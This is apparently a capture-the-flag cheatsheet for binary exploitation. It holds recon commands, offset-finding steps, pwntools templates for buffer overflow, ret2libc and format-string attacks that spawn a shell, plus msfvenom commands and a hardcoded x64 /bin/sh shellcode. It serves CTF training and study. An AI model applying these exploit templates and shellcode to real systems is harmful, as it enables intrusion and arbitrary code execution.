# PWN / Binary Exploitation Cheatsheet

## First Things to Run (Any Binary)

```bash
# Always start with these
file ./binary                      # Architecture, linking
checksec --file=./binary           # Security features
strings ./binary | grep -i flag    # Quick flag search
strings ./binary | head -50        # Interesting strings
objdump -d ./binary | head -100    # Disassembly preview
nm ./binary                        # Symbol table
ldd ./binary                       # Linked libraries
```

---

## Security Features Check

```bash
checksec --file=./binary
```

| Feature | Enabled | Bypass Strategy |
|---------|---------|-----------------|
| **RELRO** | Partial/Full | Full = no GOT overwrite |
| **Stack Canary** | Yes | Leak canary, brute force (fork) |
| **NX** | Yes | ROP, ret2libc |
| **PIE** | Yes | Leak PIE base |
| **ASLR** | Yes | Leak addresses, brute force |

---

## Finding Vulnerabilities

### Dangerous Functions
```bash
objdump -d ./binary | grep -E "gets|strcpy|sprintf|scanf|strcat|vsprintf"
objdump -t ./binary | grep -E "gets|strcpy|sprintf|scanf"
```

### Format String Check
```bash
# Look for printf with user input
objdump -d ./binary | grep printf
# Test: input "%p %p %p %p"
```

### Buffer Overflow Check
```bash
# Look for fixed-size buffers with unbounded input
# Test with: python3 -c "print('A'*1000)" | ./binary
```

---

## Finding Useful Addresses

### Functions
```bash
# All symbols
nm ./binary

# Specific functions
objdump -t ./binary | grep -E "main|win|flag|shell|system"

# PLT entries
objdump -d ./binary | grep "@plt"

# With pwntools
python3 -c "from pwn import *; e=ELF('./binary'); print(hex(e.symbols['main']))"
```

### GOT/PLT
```bash
objdump -R ./binary                # GOT entries
readelf -r ./binary                # Relocations

# With pwntools
python3 -c "
from pwn import *
e = ELF('./binary')
print('puts@plt:', hex(e.plt['puts']))
print('puts@got:', hex(e.got['puts']))
"
```

### Gadgets (ROP)
```bash
ROPgadget --binary ./binary
ROPgadget --binary ./binary --only "pop|ret"
ROPgadget --binary ./binary | grep "pop rdi"
ropper -f ./binary
one_gadget ./libc.so.6            # One-shot gadgets in libc
```

### String Addresses
```bash
strings -t x ./binary | grep "/bin/sh"
# With pwntools
python3 -c "from pwn import *; e=ELF('./binary'); print(list(e.search(b'/bin/sh')))"
```

---

## Finding Offset to Return Address

### Cyclic Pattern Method
```bash
# Generate pattern
python3 -c "from pwn import *; print(cyclic(200).decode())"

# Run binary, get crash address (e.g., 0x61616168)
# Find offset
python3 -c "from pwn import *; print(cyclic_find(0x61616168))"
```

### GDB Method
```bash
gdb ./binary
> run < <(python3 -c "print('A'*100)")
> info registers
> x/20x $rsp
```

### pwndbg/GEF
```bash
gdb ./binary
pwndbg> cyclic 200
pwndbg> run
# After crash
pwndbg> cyclic -l 0x61616168
```

---

## Common Exploits

### Buffer Overflow (No Protection)
```python
from pwn import *

binary = './vuln'
elf = ELF(binary)
io = process(binary)

offset = 72
win = elf.symbols['win']  # or address of shellcode

payload = flat(
    b'A' * offset,
    win
)

io.sendline(payload)
io.interactive()
```

### ret2libc
```python
from pwn import *

binary = './vuln'
elf = ELF(binary)
libc = ELF('./libc.so.6')
io = process(binary)

# Leak libc address
rop = ROP(elf)
rop.puts(elf.got['puts'])
rop.main()

io.sendline(flat(b'A'*offset, rop.chain()))
leaked = u64(io.recvline().strip().ljust(8, b'\x00'))
libc.address = leaked - libc.symbols['puts']
log.info(f"libc base: {hex(libc.address)}")

# Second stage
rop2 = ROP(libc)
rop2.system(next(libc.search(b'/bin/sh\x00')))

io.sendline(flat(b'A'*offset, rop2.chain()))
io.interactive()
```

### Format String (Leak)
```python
from pwn import *

io = process('./vuln')

# Leak stack values
for i in range(1, 20):
    io.sendline(f'%{i}$p'.encode())
    print(f"{i}: {io.recvline()}")
```

### Format String (Write)
```python
from pwn import *

binary = './vuln'
elf = ELF(binary)
io = process(binary)

# Overwrite GOT entry
target = elf.got['exit']
value = elf.symbols['win']

# Use fmtstr_payload
payload = fmtstr_payload(offset, {target: value})
io.sendline(payload)
```

---

## Shellcode

### Generate Shellcode
```bash
# x64 execve /bin/sh
msfvenom -p linux/x64/exec CMD=/bin/sh -f python

# x86 execve /bin/sh
msfvenom -p linux/x86/exec CMD=/bin/sh -f python

# Pwntools
python3 -c "from pwn import *; context.arch='amd64'; print(shellcraft.sh())"
python3 -c "from pwn import *; context.arch='amd64'; print(asm(shellcraft.sh()).hex())"
```

### Common Shellcode (x64)
```python
# 27 bytes /bin/sh
shellcode = bytes.fromhex(
    "31f6f7e6526a685768"
    "2f62696e682f2f2f73"
    "6889e74831d2b03b0f05"
)
```

---

## GDB Commands

### Basic
```bash
gdb ./binary
> r                           # Run
> r < input.txt               # Run with input
> b main                      # Breakpoint
> b *0x401234                 # Breakpoint at address
> c                           # Continue
> si                          # Step instruction
> ni                          # Next instruction
> info registers              # Show registers
> x/20x $rsp                  # Examine stack
> x/s 0x404000                # Examine string
> vmmap                       # Memory map (pwndbg)
> telescope $rsp 20           # Stack view (pwndbg)
```

### With pwntools
```python
io = gdb.debug('./binary', '''
    b main
    b *0x401234
    continue
''')
```

---

## Pwntools Cheatsheet

### Setup
```python
from pwn import *

binary = './vuln'
elf = ELF(binary)
context.binary = elf
context.log_level = 'debug'  # or 'info'
```

### I/O
```python
# Local
io = process(binary)

# Remote
io = remote('host', 1337)

# GDB
io = gdb.debug(binary, 'b main')
```

### Sending/Receiving
```python
io.send(b'data')              # Send raw
io.sendline(b'data')          # Send with newline
io.sendafter(b'> ', b'data')  # Send after prompt
io.sendlineafter(b'> ', b'data')

io.recv(100)                  # Receive 100 bytes
io.recvline()                 # Receive line
io.recvuntil(b'flag')         # Receive until marker
io.recvall()                  # Receive everything
io.interactive()              # Interactive shell
```

### Packing
```python
p64(0xdeadbeef)               # Pack 64-bit
p32(0xdeadbeef)               # Pack 32-bit
u64(b'\xef\xbe\xad\xde\x00\x00\x00\x00')  # Unpack 64-bit

flat(b'AAAA', 0xdeadbeef, p64(0x1234))  # Flatten payload
```

### Finding
```python
cyclic(200)                   # Generate pattern
cyclic_find(0x61616168)       # Find offset

list(elf.search(b'/bin/sh'))  # Find string in binary
```

---

## One-Liners

```bash
# Quick test for buffer overflow
python3 -c "print('A'*1000)" | ./binary

# Check for stack executable
readelf -l ./binary | grep GNU_STACK

# Find libc version from leak
# https://libc.rip/ or libc-database

# Compile without protections
gcc -fno-stack-protector -z execstack -no-pie -o vuln vuln.c
```
